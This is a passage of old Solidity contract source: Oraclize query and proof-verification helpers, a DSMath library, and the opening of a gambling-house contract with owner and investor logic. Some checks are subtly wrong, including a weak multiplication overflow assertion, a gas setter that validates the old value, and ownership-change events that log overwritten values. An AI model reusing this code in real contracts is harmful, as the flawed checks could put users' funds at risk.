args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce;\n bytes memory sessionKeyHash;\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\npragma solidity ^0.4.10;\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x * y) >= x);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x * y) >= x);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract LedgerProofVerifyI {\n function external_oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) public;\n function external_oraclize_randomDS_proofVerify(bytes proof, bytes32 queryId, bytes result, string context_name) public returns (bool);\n}\ncontract Owned {\n address public owner;\n modifier onlyOwner {\n assert(msg.sender == owner);\n _;\n }\n function Owned() {\n owner = msg.sender;\n }\n}\ncontract oraclizeSettings is Owned {\n uint constant ORACLIZE_PER_SPIN_GAS_LIMIT = 6100;\n uint constant ORACLIZE_BASE_GAS_LIMIT = 200000;\n uint safeGas = 9000;\n event newGasLimit(uint _gasLimit);\n function setSafeGas(uint _gas)\n onlyOwner\n {\n assert(ORACLIZE_BASE_GAS_LIMIT + safeGas >= ORACLIZE_BASE_GAS_LIMIT);\n assert(safeGas <= 25000);\n safeGas = _gas;\n newGasLimit(_gas);\n }\n}\ncontract HouseManaged is Owned {\n address public houseAddress;\n bool public isStopped;\n event LOG_ContractStopped();\n event LOG_ContractResumed();\n event LOG_OwnerAddressChanged(address oldAddr, address newOwnerAddress);\n event LOG_HouseAddressChanged(address oldAddr, address newHouseAddress);\n modifier onlyIfNotStopped {\n assert(!isStopped);\n _;\n }\n modifier onlyIfStopped {\n assert(isStopped);\n _;\n }\n function HouseManaged() {\n houseAddress = msg.sender;\n }\n function stop_or_resume_Contract(bool _isStopped)\n onlyOwner {\n isStopped = _isStopped;\n }\n function changeHouse_and_Owner_Addresses(address newHouse, address newOwner)\n onlyOwner {\n assert(newHouse != address(0x0));\n assert(newOwner != address(0x0));\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n houseAddress = newHouse;\n LOG_HouseAddressChanged(houseAddress, newHouse);\n }\n}\ncontract usingInvestorsModule is HouseManaged, oraclizeSettings {\n uint constant MAX_INVESTORS = 5;\n uint constant divestFee = 50;\n struct Investor {\n address investorAddress;\n uint amountInvested;\n bool votedForEmergencyWithdrawal;\n }\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public numInvestors = 0;\n uint public invested = 0;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n event LOG_InvestorEntrance(address investor, uint amount);\n event LOG_InvestorCapitalUpdate(address investor, int amount);\n event LOG_InvestorExit(address investor, uint amount);\n event LOG_EmergencyAutoStop();\n event LOG_ZeroSend();\n event LOG_ValueIsTooBig();\n event LOG_FailedSend(address addr, uint value);\n event LOG_SuccessfulSend(address addr, uint value);\n modifier onlyMoreThanMinInvestment {\n assert(msg.value > getMinInvestment());\n _;\n }\n modifier onlyMoreThanZero {\n assert(msg.value != 0);\n _;\n }\n modifier onlyInvestors {\n assert(investorIDs[msg.sender] != 0);\n _;\n }\n modifier onlyNotInvestors {\n assert(investorIDs[msg.sender] == 0);\n _;\n }\n modifier investorsInvariant {\n _;\n assert(numInvestors <= MAX_INVESTORS);\n }\n modifier onlyIfProfitNotDistributed {\n if (!profitDistributed) {\n _;\n }\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invested < investorsProfit) ||\n (invested + investorsProfit < invested) ||\n (invested + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invested + investorsProfit - investorsLosses;\n }\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (numInvestors == MAX_INVESTORS) {\n uint investorID = 